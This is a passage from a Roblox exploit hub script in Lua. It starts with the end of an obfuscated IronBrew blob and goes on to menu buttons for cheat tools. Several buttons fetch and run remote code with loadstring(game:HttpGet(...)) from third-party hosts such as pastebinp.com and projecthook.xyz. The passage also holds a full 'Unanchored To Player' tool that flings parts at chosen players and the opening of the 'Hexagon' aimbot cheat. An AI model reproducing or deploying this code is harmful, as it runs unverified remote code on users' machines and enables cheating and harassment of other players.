if(gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("tE")]]==gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("3Xat")]])then gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;else gamepass_llllllIlIIIllI=gamepass_lIlIlIllIlIIlIllllIlIlI[#("ELu")];end;else local gamepass_lIIlIlIIIllIlll;local gamepass_IIIIlIllllIlIIlIl;gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("aL")]]=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#{{433;860;431;336};"1 + 1 = 111";{186;314;524;629};}]][gamepass_lIlIlIllIlIIlIllllIlIlI[#{{568;990;671;798};"1 + 1 = 111";{886;693;515;34};{821;589;730;215};}]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("HZ")]]=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("abV")]][gamepass_lIlIlIllIlIIlIllllIlIlI[#("FBKM")]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("Ki")]]=gamepass_IIlIIlllIIIlllIIIIll[gamepass_lIlIlIllIlIIlIllllIlIlI[#("TCA")]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IIIIlIllllIlIIlIl=gamepass_lIlIlIllIlIIlIllllIlIlI[#{"1 + 1 = 111";"1 + 1 = 111";}];gamepass_lIIlIlIIIllIlll=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("A0R")]];gamepass_IlIIIllIIIlllI[gamepass_IIIIlIllllIlIIlIl+1]=gamepass_lIIlIlIIIllIlll;gamepass_IlIIIllIIIlllI[gamepass_IIIIlIllllIlIIlIl]=gamepass_lIIlIlIIIllIlll[gamepass_lIlIlIllIlIIlIllllIlIlI[#("BaSP")]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("Mn")]]=gamepass_lIlIlIllIlIIlIllllIlIlI[#("3DJ")];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IIIIlIllllIlIIlIl=gamepass_lIlIlIllIlIIlIllllIlIlI[#{"1 + 1 = 111";{255;653;305;159};}]gamepass_IlIIIllIIIlllI[gamepass_IIIIlIllllIlIIlIl]=gamepass_IlIIIllIIIlllI[gamepass_IIIIlIllllIlIIlIl](gamepass_lIIlIlIIllIIIIIlIIll(gamepass_IlIIIllIIIlllI,gamepass_IIIIlIllllIlIIlIl+1,gamepass_lIlIlIllIlIIlIllllIlIlI[#{{823;635;254;2};{495;149;109;886};"1 + 1 = 111";}]))gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IIIIlIllllIlIIlIl=gamepass_lIlIlIllIlIIlIllllIlIlI[#{"1 + 1 = 111";{297;121;255;730};}];gamepass_lIIlIlIIIllIlll=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("hVE")]];gamepass_IlIIIllIIIlllI[gamepass_IIIIlIllllIlIIlIl+1]=gamepass_lIIlIlIIIllIlll;gamepass_IlIIIllIIIlllI[gamepass_IIIIlIllllIlIIlIl]=gamepass_lIIlIlIIIllIlll[gamepass_lIlIlIllIlIIlIllllIlIlI[#("PLs8")]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("3M")]]=gamepass_IIlIIlllIIIlllIIIIll[gamepass_lIlIlIllIlIIlIllllIlIlI[#("cls")]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#{"1 + 1 = 111";"1 + 1 = 111";}]]=gamepass_IlIIIllIIIlllI[gamepass_lIlIlIllIlIIlIllllIlIlI[#("Npb")]][gamepass_lIlIlIllIlIIlIllllIlIlI[#("4pPV")]];gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lllIIIllll[gamepass_llllllIlIIIllI];gamepass_IIIIlIllllIlIIlIl=gamepass_lIlIlIllIlIIlIllllIlIlI[#("OF")]gamepass_IlIIIllIIIlllI[gamepass_IIIIlIllllIlIIlIl]=gamepass_IlIIIllIIIlllI[gamepass_IIIIlIllllIlIIlIl](gamepass_lIIlIlIIllIIIIIlIIll(gamepass_IlIIIllIIIlllI,gamepass_IIIIlIllllIlIIlIl+1,gamepass_lIlIlIllIlIIlIllllIlIlI[#("m9K")]))end;gamepass_llllllIlIIIllI=gamepass_llllllIlIIIllI+1;end;end;A,B=gamepass_lIllIlIIIIIIlIIlllIIII(gamepass_IlIIIlIII(gamepass_llllllIllIllIl))if not A[1]then local gamepass_lIlIlIllIlIIlIllllIlIlI=gamepass_lIIlIlIIIllIlll[4][gamepass_llllllIlIIIllI]or'?';error('ERROR IN IRONBREW SCRIPT [LINE '..gamepass_lIlIlIllIlIIlIllllIlIlI..']:'..A[2]);wait(9e9);else return gamepass_lIIlIlIIllIIIIIlIIll(A,2,B);end;end);end;return gamepass_IlIlIlllllIllII(true,{},gamepass_IllIlIIllllllIl())();end)(string.byte,table.insert,setmetatable);
end)

local ChaosScript = ScriptsTab.AddButton("Chaos Script", function()
loadstring(game:HttpGet(("https://pastebinp.com/raw/KtHecMKT"), true))()
end)

local ChatBypass = ScriptsTab.AddButton("Chat Bypass", function()
loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
end)

local ClickFling = ScriptsTab.AddButton("Click Fling", function()
_G.ClickFling=false -- Set this to true if u want.
loadstring(game:HttpGet(('https://raw.githubusercontent.com/OofHead-FE/nexo-before-deleted/main/NexoPD'),true))()
end)

local ProjectHook = ScriptsTab.AddButton("Project Hook", function()
loadstring(game:HttpGet("https://projecthook.xyz/scripts/new-free.lua"))()
end)

local ControlUnanchored = ScriptsTab.AddButton("Control Unanchored", function()
--TOMQ-SCRIPT-2020
-- prevent from being ran more than once


if not _G.ini then
_G.ini = true

local sound = Instance.new("Sound")
sound.SoundId = "rbxassetid://216917652"
sound.Parent = game:GetService("SoundService")
sound:Play()



wait()
game.StarterGui:SetCore("SendNotification", {
Title = "Unanchored To Player"; -- the title (ofc)
Text = "GUI Loaded - F to Hide/Show"; -- what the text says (ofc)
Duration = 5; -- how long the notification should in secounds
})

print "================UNANCHORED TO PLAYER LOADED================"
print "================MADE BY TomQ#6764================"

local heartbeat = game:GetService("RunService").Heartbeat
spawn(function()
    while true do heartbeat:Wait()
    for i,v in pairs(game.Players:GetPlayers()) do
        if v == game.Players.LocalPlayer == false then
            game.Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge,math.huge)*math.huge
            game.Players.LocalPlayer.SimulationRadius = math.pow(math.huge,math.huge)*math.huge
            v.MaximumSimulationRadius = 0
            v.SimulationRadius = 0
            game:GetService("RunService").Stepped:wait()
    end
end
end
end)

local Imput = game:GetService("UserInputService")
local Plr = game.Players.LocalPlayer
local Mouse = Plr:GetMouse()

function To(position)
local Chr = Plr.Character
local sound2 = Instance.new("Sound")
sound2.SoundId = "rbxassetid://3398620867"
sound2.Parent = game:GetService("SoundService")
if Chr ~= nil then
for index, part in pairs(game:GetDescendants()) do
if part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then --// Checks Part Properties
    part.CFrame = CFrame.new(position) --TP Part To Mouse
    sound2:Play()

    if spam == true and part:FindFirstChild("BodyGyro") == nil then
    local bodyPos = Instance.new("BodyPosition")
    bodyPos.Position = part.Position
    bodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bodyPos.P = 1e6
    bodyPos.Parent = part
    end
end
end
end
end





Imput.InputBegan:Connect(function(input)
   if input.UserInputType == Enum.UserInputType.MouseButton1 and Imput:IsKeyDown(Enum.KeyCode.LeftControl) then
       To(Mouse.Hit.p)
   end
end)







-- key that opens/closes the ui
local toggle_key = Enum.KeyCode.F

-- function that executes desired code
execute = function(name)



    for index, part in pairs(game:GetDescendants()) do
    if part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then --// Checks Part Properties
    part.CFrame = CFrame.new(game.workspace[name].Head.Position) --TP Part To User
    end
    end



end

local uis = game:GetService("UserInputService")
local ts = game:GetService("TweenService")

-- ui functions
fade = function(obj, len, props)
	ts:Create(obj, TweenInfo.new(len, Enum.EasingStyle.Sine), props):Play()
end

-- shorthand variables
local u2, c3 = UDim2.new, Color3.fromRGB
local u2f, c3w = u2(1, 0, 1, 0), c3(255, 255, 255)

-- ui init
local g = Instance.new("ScreenGui", game.CoreGui)
local f = Instance.new("Frame", g)
local t = Instance.new("TextLabel", f)
local c = Instance.new("ScrollingFrame", f)

-- core ui styling
local padding = Instance.new("UIPadding", f)
local maxsize = Instance.new("UISizeConstraint", f)
local textsize = Instance.new("UITextSizeConstraint", t)
local listcons = Instance.new("UIListLayout", c)

padding.PaddingBottom = UDim.new(0, 8)
padding.PaddingLeft = UDim.new(0, 15)
padding.PaddingRight = UDim.new(0, 15)
padding.PaddingTop = UDim.new(0, 0)

maxsize.MaxSize = Vector2.new(275, 450)
maxsize.MinSize = Vector2.new(200, 0)
textsize.MaxTextSize = 16
listcons.Padding = UDim.new(0, 3)

-- ui instance properties
g.Name = "unanchor_ui"
g.ResetOnSpawn = false
f.Name = "main"
t.Name = "header"

f.Size = u2(0.165, 0, 0.6, 0)
f.BorderSizePixel = 0
f.BackgroundTransparency = 0.3
f.Position = u2(1, -215, 0.5, -150)
f.BackgroundColor3 = c3()
f.AnchorPoint = Vector2.new(1, 0.5)
f.Position = u2(1, -15, 0.5, 0)

t.Size = u2(1, 0, 0.1, 0)
t.BackgroundTransparency = 1
t.TextColor3 = c3w
t.Font = Enum.Font.GothamBold
t.TextScaled = true
t.TextXAlignment = Enum.TextXAlignment.Center
t.Text = "UNANCHORED TO PLAYER BY TomQ#6764"

c.Name = "playerlist"
c.Position = u2(0, 0, 0.1, 0)
c.Size = u2(1, 0, 0.45, 0)
c.BackgroundTransparency = 1
c.BorderSizePixel = 0
c.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
c.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
c.ScrollingDirection = Enum.ScrollingDirection.Y
c.ScrollBarThickness = 5
c.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar

-- playerlist entry ui template
local temp = Instance.new("Frame", f)
temp.Name = "temp"
temp.Visible = false
temp.Size = u2(1, -5, 0, 27)
temp.BackgroundTransparency = 0.5
temp.BorderSizePixel = 0
temp.ClipsDescendants = true
temp.BackgroundColor3 = c3()

local tpad = Instance.new("UIPadding", temp)
tpad.PaddingLeft = UDim.new(0, 5)
tpad.PaddingRight = UDim.new(0, 5)

local tb = Instance.new("TextButton", temp)
tb.Name = "button"
tb.BackgroundTransparency = 1
tb.ZIndex = 5
tb.BorderSizePixel = 0
tb.Text = ""
tb.Size = u2(1, 10, 1, 0)
tb.Position = u2(0, -5, 0, 0)

local tcl = Instance.new("TextLabel", temp)
tcl.Name = "username"
tcl.BackgroundTransparency = 1
tcl.BorderSizePixel = 0
tcl.Size = u2f
tcl.TextColor3 = c3w
tcl.TextXAlignment = Enum.TextXAlignment.Left
tcl.TextScaled = true
tcl.Size = u2(0.6, 0, 1, 0)
tcl.Font = Enum.Font.Gotham

local tcls = Instance.new("UITextSizeConstraint", tcl)
tcls.MaxTextSize = 14

local thumb = Instance.new("ImageLabel", temp)
thumb.Name = "thumb"
thumb.Size = u2(0.35, 0, 0.35, 0)
thumb.SizeConstraint = Enum.SizeConstraint.RelativeXX
thumb.Position = u2(1, 0, 0, -15)
thumb.AnchorPoint = Vector2.new(1, 0)
thumb.BackgroundTransparency = 1
thumb.BorderSizePixel = 0

-- settings ui
local sh = Instance.new("TextLabel", f)
sh.Name = "settings_header"
sh.Size = u2(1, 0, 0.1, 0)
sh.Position = u2(0, 0, 0.55, 0)
sh.BackgroundTransparency = 1
sh.BorderSizePixel = 0
sh.ZIndex = 3
sh.TextColor3 = c3w
sh.Font = Enum.Font.GothamBold
sh.TextScaled = true
sh.TextXAlignment = Enum.TextXAlignment.Center
sh.Text = "SETTINGS"

local shs = Instance.new("UITextSizeConstraint", sh)
shs.MaxTextSize = 16

local items = Instance.new("ScrollingFrame", f)
items.Name = "items"
items.Size = u2(1, 0, 0.35, 0)
items.Position = u2(0, 0, 0.65, 0)
items.BackgroundTransparency = 1
items.BorderSizePixel = 0
items.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
items.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
items.ScrollingDirection = Enum.ScrollingDirection.Y
items.ScrollBarThickness = 5
items.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar

local itemll = Instance.new("UIListLayout", items)
itemll.Padding = UDim.new(0, 3)

createSetting = function(name)
	local setting = Instance.new("Frame", items)
	setting.Size = u2(1, -5, 0, 27)
	setting.BackgroundColor3 = c3()
	setting.BackgroundTransparency = 0.5
	setting.BorderSizePixel = 0
	
	local spad = tpad:Clone()
	spad.Parent = setting
	
	local slab = tcl:Clone()
	slab.Name = "label"
	slab.Parent = setting
	slab.Size = u2(1, 0, 1, 0)
	slab.Text = name
	
	local stbt = tb:Clone()
	stbt.Parent = setting
	
	stbt.MouseEnter:connect(function()
		fade(setting, 0.25, {BackgroundTransparency = 0.8})
	end)
	
	stbt.MouseLeave:connect(function()
		fade(setting, 0.25, {BackgroundTransparency = 0.5})
	end)
	
	items.CanvasSize = u2(0, 0, 0, itemll.AbsoluteContentSize.Y)
	
	return stbt
end


-- settings & functionality



    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://179235828"
    sound.Parent = game:GetService("SoundService")


spam = false
local spamblocks = createSetting("Spam Parts")
spamblocks.MouseButton1Down:connect(function()
spam = not spam
   if spam then
       fade(spamblocks.Parent.label, 0.25, {TextColor3 = c3(52, 189, 98)})
       sound:Play()
       -- code to loop here
   else
       fade(spamblocks.Parent.label, 0.25, {TextColor3 = c3w})
       sound:Play()
       -- code to break the loop here
   end
end)



createSetting("Break Spam").MouseButton1Down:connect(function()
    for index, part in pairs(game:GetDescendants()) do
    if part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then --// Checks Part Properties
    sound:Play()
    if part:FindFirstChild("BodyForce") then
    part.BodyForce:Destroy()
    end

    if part:FindFirstChild("BodyGyro") then
    part.BodyGyro:Destroy()
    end

    if part:FindFirstChild("BodyPosition") then
    part.BodyPosition:Destroy()
    end

    if part:FindFirstChild("BodyThrust") then
    part.BodyThrust:Destroy()
    end
end
end
end)

freeze = false
local freezeblocks = createSetting("Freeze Parts")
freezeblocks.MouseButton1Down:connect(function()
freeze = not freeze
    if freeze then
        fade(freezeblocks.Parent.label, 0.25, {TextColor3 = c3(52, 189, 98)})
        sound:Play()
        print "UTP: Freezed Parts"
        for _,part in pairs(workspace:GetChildren()) do
        if part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then --// Checks Part Properties
            local bodyPos = Instance.new("BodyPosition")
            bodyPos.Position = part.Position
            bodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bodyPos.P = 1e6
            bodyPos.Parent = part
        end
        end
    else
        fade(freezeblocks.Parent.label, 0.25, {TextColor3 = c3w})
        sound:Play()
        print "UTP: Thawed Parts"
        for _,part in pairs(workspace:GetChildren()) do
        if part:IsA("BasePart" or "UnionOperation" or "Model") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false then --// Checks Part Properties
            if part:FindFirstChild("BodyPosition") then
            part.BodyPosition:Destroy()
            end
        end
       -- code to break the loop here
end
end
end)

createSetting("Remove Accessories Mesh").MouseButton1Down:connect(function()
    sound:Play()

    local plr = game:GetService("Players").LocalPlayer
    local char = plr.Character
    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
    if v:IsA("Accessory") and v.Handle:FindFirstChild("SpecialMesh") then
    ag = v.Handle:FindFirstChild("SpecialMesh")
    ag:Destroy()
    end
    end


    local plr = game:GetService("Players").LocalPlayer
    local char = plr.Character
    for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
    if v:IsA("Accessory") and v.Handle:FindFirstChild("Mesh") then
    ag = v.Handle:FindFirstChild("Mesh")
    ag:Destroy()
    end
    end
end)

createSetting("Drop Accessories").MouseButton1Down:connect(function()
    sound:Play()
	for _,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
		if v:IsA("Accessory") then
            v.Handle.Parent = workspace
			v.Parent = workspace
		end
	end
end)

createSetting("Reset").MouseButton1Down:connect(function()
    sound:Play()
	game.Players.LocalPlayer.Character:BreakJoints()
end)


highlight = false
local highlights = createSetting("Highlight Unanchored")
highlights.MouseButton1Down:connect(function()
highlight = not highlight
    if highlight then
        fade(highlights.Parent.label, 0.25, {TextColor3 = c3(52, 189, 98)})
        sound:Play()
        print "UTP: Unanchored Highlighted"
        for _,part in pairs(workspace:GetDescendants()) do
        if part:IsA("BasePart") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false and part:FindFirstChild("Weld") == nil then --// Checks Part Properties
            local selectionBox = Instance.new("SelectionBox")
            selectionBox.Adornee = part
            selectionBox.Color3 = Color3.new(1,0,0)
            selectionBox.Parent = part
        end
        end
    else
        fade(highlights.Parent.label, 0.25, {TextColor3 = c3w})
        sound:Play()
        print "UTP: Unanchored Un-Highlighted"
        for _,part in pairs(workspace:GetDescendants()) do
        if part:IsA("BasePart") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false and part:FindFirstChild("Weld") == nil then --// Checks Part Properties
            if part:FindFirstChild("SelectionBox") then
            part.SelectionBox:Destroy()
            end
        end
end
end
end)

createSetting("Check Other Players").MouseButton1Down:connect(function()
    sound:Play()
    g = 0
    spawn(function()
        for i,v in pairs(game.Players:GetPlayers()) do
            if v.SimulationRadius > 5555 then
                g = g + 1
                print(v.Name, "is using Unanchored To Player")
                game:GetService("RunService").Stepped:wait()
                
        end
    end
    print ("Checked all players, found", g ,"using Unanchored To Player")
    end)
end)

createSetting("Count Unanchored Parts").MouseButton1Down:connect(function()
    sound:Play()
    b = 0
    for index, part in pairs(game.workspace:GetDescendants()) do
    if part:IsA("BasePart") and part.Anchored == false and part:IsDescendantOf(game.Players.LocalPlayer.Character) == false and part.Name == "Torso" == false and part.Name == "Head" == false and part.Name == "Right Arm" == false and part.Name == "Left Arm" == false and part.Name == "Right Leg" == false and part.Name == "Left Leg" == false and part.Name == "HumanoidRootPart" == false and part:FindFirstChild("Weld") == nil then --// Checks Part Properties
        b = b + 1
    end
    end
    print ("All parts checked, found", b ,"that are unanchored")
end)








createEntry = function(name, id)
	local entry = temp:Clone()
	entry.Parent = c
	entry.username.Text = name
	entry.thumb.Image = game:GetService("Players"):GetUserThumbnailAsync(id, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
	entry.Visible = true
	entry.LayoutOrder = #c:GetChildren()
	entry.Name = name

    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://3398620867"
    sound.Parent = game:GetService("SoundService")
	-- handle clicking for player
	entry.button.MouseButton1Down:connect(function()
		execute(name)
        sound:Play()
	end)
	
	entry.button.MouseEnter:connect(function()
		fade(entry, 0.25, {BackgroundTransparency = 0.8})
	end)
	
	entry.button.MouseLeave:connect(function()
		fade(entry, 0.25, {BackgroundTransparency = 0.5})
	end)
end

deleteEntry = function(name)
	for _,v in pairs(c:GetChildren()) do
		if v.Name == name then
			v:Destroy()
		end
	end
end

-- create entry for client
createEntry(game.Players.LocalPlayer.Name, game.Players.LocalPlayer.UserId)

-- create entries for all other players
for _,v in pairs(game.Players:GetPlayers()) do
	if v ~= game.Players.LocalPlayer then
		createEntry(v.Name, v.UserId)
	end
end

listcons:GetPropertyChangedSignal("AbsoluteContentSize"):connect(function()
	c.CanvasSize = u2(0, 0, 0, listcons.AbsoluteContentSize.Y)
end)

itemll:GetPropertyChangedSignal("AbsoluteContentSize"):connect(function()
	items.CanvasSize = u2(0, 0, 0, itemll.AbsoluteContentSize.Y)
end)

uis.InputBegan:connect(function(input, gpe)
	if not gpe then
		if input.KeyCode == toggle_key then
			g.Enabled = not g.Enabled
		end
	end
end)

-- dragging code, ripped from https://devforum.roblox.com/t/draggable-property-is-hidden-on-gui-objects/107689/5
local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	f.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

f.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = f.Position
		
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

f.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

uis.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)

game.Players.PlayerAdded:connect(function(plr)
	createEntry(plr.Name, plr.UserId)
end)

game.Players.PlayerRemoving:connect(function(plr)
	deleteEntry(plr.Name)
end)
else
print "================ALREADY LOADED================"



    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://2130284653"
    sound.Parent = game:GetService("SoundService")
sound:Play()

game.StarterGui:SetCore("SendNotification", {
Title = "Already Loaded"; -- the title (ofc)
Text = "GUI Already Loaded"; -- what the text says (ofc)
Duration = 5; -- how long the notification should in secounds
})
end
end)

local Hexagon = ScriptsTab.AddButton("Hexagon", function()
local Hint = Instance.new("Hint", game.CoreGui)
Hint.Text = "Hexagon | Waiting for the game to load..."

repeat wait() until game:IsLoaded()
repeat wait() until game.Players.LocalPlayer.PlayerGui:FindFirstChild("GUI")

Hint.Text = "Hexagon | Setting up environment..."

-- Services
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

-- Environment
local getrawmetatable = getrawmetatable or false
local http_request = http_request or request or (http and http.request) or (syn and syn.request) or false
local mousemove = mousemove or mousemoverel or mouse_move or false
local getsenv = getsenv or false
local listfiles = listfiles or listdir or syn_io_listdir or false
local isfolder = isfolder or false

if (getrawmetatable == false) then return game.Players.LocalPlayer:Kick("Exploit not supported! Missing: getrawmetatable.") end
if (http_request == false) then return game.Players.LocalPlayer:Kick("Exploit not supported! Missing: request.") end
if (mousemove == false) then return game.Players.LocalPlayer:Kick("Exploit not supported! Missing: mousemove.") end
if (getsenv == false) then return game.Players.LocalPlayer:Kick("Exploit not supported! Missing: getsenv.") end
if (listfiles == false) then return game.Players.LocalPlayer:Kick("Exploit not supported! Missing: listfiles.") end
if (isfolder == false) then return game.Players.LocalPlayer:Kick("Exploit not supported! Missing: isfolder.") end

Hint.Text = "Hexagon | Setting up configuration settings..."

if not isfolder("hexagon") then
	print("creating hexagon folder")
	makefolder("hexagon")
end

if not isfolder("hexagon/configs") then
	print("creating hexagon configs folder")
	makefolder("hexagon/configs")
end

if not isfile("hexagon/autoload.txt") then
	print("creating hexagon autoload file")
	writefile("hexagon/autoload.txt", "")
end

if not isfile("hexagon/custom_skins.txt") then
	print("downloading hexagon custom skins file")
	writefile("hexagon/custom_skins.txt", game:HttpGet("https://raw.githubusercontent.com/Pawel12d/hexagon/main/scripts/default_data/custom_skins.txt"))
end

if not isfile("hexagon/custom_models.txt") then
	print("downloading hexagon custom models file")
	writefile("hexagon/custom_models.txt", game:HttpGet("https://raw.githubusercontent.com/Pawel12d/hexagon/main/scripts/default_data/custom_models.txt"))
end

if not isfile("hexagon/inventories.txt") then
	print("downloading hexagon inventories file")
	writefile("hexagon/inventories.txt", game:HttpGet("https://raw.githubusercontent.com/Pawel12d/hexagon/main/scripts/default_data/inventories.txt"))
end

if not isfile("hexagon/skyboxes.txt") then
	print("downloading hexagon skyboxes file")
	writefile("hexagon/skyboxes.txt", game:HttpGet("https://raw.githubusercontent.com/Pawel12d/hexagon/main/scripts/default_data/skyboxes.txt"))
end

Hint.Text = "Hexagon | Loading..."

-- Viewmodels fix
for i,v in pairs(game.ReplicatedStorage.Viewmodels:GetChildren()) do
    if v:FindFirstChild("HumanoidRootPart") and v.HumanoidRootPart.Transparency ~= 1 then
        v.HumanoidRootPart.Transparency = 1
    end
end

game.ReplicatedStorage.Viewmodels["v_oldM4A1-S"].Silencer.Transparency = 1
local fix = game.ReplicatedStorage.Viewmodels["v_oldM4A1-S"].Silencer:Clone()
fix.Parent = game.ReplicatedStorage.Viewmodels["v_oldM4A1-S"]
fix.Name = "Silencer2"
fix.Transparency = 0

local Hitboxes = {
	["Head"] = {"Head"},
	["Chest"] = {"UpperTorso", "LowerTorso"},
	["Arms"] = {"LeftUpperArm", "LeftLowerArm", "LeftHand", "RightUpperArm", "RightLowerArm", "RightHand"},
	["Legs"] = {"LeftUpperLeg", "LeftLowerLeg", "LeftFoot", "RightUpperLeg", "RightLowerLeg", "RightFoot"}
}

local HexagonFolder = Instance.new("Folder", workspace)
HexagonFolder.Name = "HexagonFolder"

local oldOsPlatform = game.Players.LocalPlayer.OsPlatform
local oldMusicT = game.Players.LocalPlayer.PlayerGui.Music.ValveT:Clone()
local oldMusicCT = game.Players.LocalPlayer.PlayerGui.Music.ValveCT:Clone()

local Weapons = {}; for i,v in pairs(game.ReplicatedStorage.Weapons:GetChildren()) do if v:FindFirstChild("Model") then table.insert(Weapons, v.Name) end end

local Sounds = {
	["TTT a"] = workspace.RoundEnd,
	["TTT b"] = workspace.RoundStart,
	["T Win"] = workspace.Sounds.T,
	["CT Win"] = workspace.Sounds.CT,
	["Planted"] = workspace.Sounds.Arm,
	["Defused"] = workspace.Sounds.Defuse,
	["Rescued"] = workspace.Sounds.Rescue,
	["Explosion"] = workspace.Sounds.Explosion,
	["Becky"] = workspace.Sounds.Becky,
	["Beep"] = workspace.Sounds.Beep
}
	
local FOVCircle = Drawing.new("Circle")
local Cases = {}; for i,v in pairs(game.ReplicatedStorage.Cases:GetChildren()) do table.insert(Cases, v.Name) end

local Configs = {}
local Inventories = loadstring("return "..readfile("hexagon/inventories.txt"))()
local Skyboxes = loadstring("return "..readfile("hexagon/skyboxes.txt"))()



-- Main
local SilentLegitbot = {target = nil}
local SilentRagebot = {target = nil, cooldown = false}
local LocalPlayer = game.Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local cbClient = getsenv(LocalPlayer.PlayerGui:WaitForChild("Client"))
local oldInventory = cbClient.CurrentInventory
local nocw_s = {}
local nocw_m = {}
local curVel = 16
local isBhopping = false

